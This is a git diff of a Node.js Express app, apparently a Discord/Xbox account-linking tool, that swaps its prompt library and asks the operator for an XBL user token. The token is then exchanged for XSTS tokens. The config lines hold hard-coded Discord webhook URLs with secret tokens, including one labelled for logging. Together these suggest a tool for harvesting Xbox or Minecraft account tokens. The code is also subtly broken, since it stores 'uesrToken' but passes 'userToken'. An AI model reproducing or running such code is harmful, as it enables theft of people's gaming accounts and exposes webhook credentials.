@@ -5,9 +5,10 @@ const redirect_uri = 'https://linkdiscord.herokuapp.com'
 const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 // Config end
+const stripAnsi = require('strip-ansi')
+const prompt = require('prompt-sync')()
 const axios = require('axios')
 const express = require('express')
-const prompt = require('prompt');
 const app = express()
 const port = process.env.PORT || 3000
 
@@ -18,7 +19,7 @@ app.get('/', async (req, res) => {
     try {
         console.log('1')
         console.log('all of those parameters were obsolete, the fun part begins')
-        const uesrToken = prompt("give xbl token now")
+        const uesrToken = prompt('give xbl token lol')
         console.log('user token set')
         const xstsTokenHashArray = await getXSTSToken(userToken)
         console.log('got array')
